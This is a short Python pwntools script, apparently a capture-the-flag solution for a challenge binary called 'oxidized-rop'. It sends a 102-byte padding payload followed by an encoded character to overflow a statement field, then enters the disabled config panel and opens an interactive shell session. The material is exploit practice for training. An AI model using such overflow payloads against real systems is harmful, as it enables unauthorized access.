import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'oxidized-rop.orig'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

payload = (b'A' * 102) + chr(123456).encode()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)

io.sendlineafter(b'Selection: ', b'1')
io.sendlineafter(b'Statement (max 200 characters): ', payload)

io.sendlineafter(b'Selection: ', b'2')
io.recvuntil(b'Config panel login has been disabled by the administrator.\n')

success('Welcome to your terminal')
io.interactive()
